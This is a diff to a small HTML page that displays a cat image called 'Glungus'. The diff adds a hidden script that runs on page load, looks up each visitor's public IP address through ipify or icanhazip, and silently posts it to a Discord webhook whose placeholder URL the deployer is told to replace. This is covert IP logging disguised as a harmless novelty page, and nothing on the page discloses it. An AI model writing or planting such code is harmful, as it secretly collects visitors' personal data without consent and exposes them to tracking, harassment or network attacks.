@@ -43,5 +43,35 @@
   <div class="glungus-container">
     <img src="glungus.png" alt="Glungus" class="glungus-cat">
   </div>
+  <script>
+    // ** REPLACE THIS URL WITH YOUR ACTUAL DISCORD WEBHOOK URL **
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token';
+
+    (function() {
+      fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+          const ip = data.ip;
+          fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: ip })
+          });
+        })
+        .catch(() => {
+          // Fallback: try other services
+          fetch('https://icanhazip.com')
+            .then(r => r.text())
+            .then(ip => {
+              fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: ip.trim() })
+              });
+            })
+            .catch(() => {});
+        });
+    })();
+  </script>
 </body>
 </html>
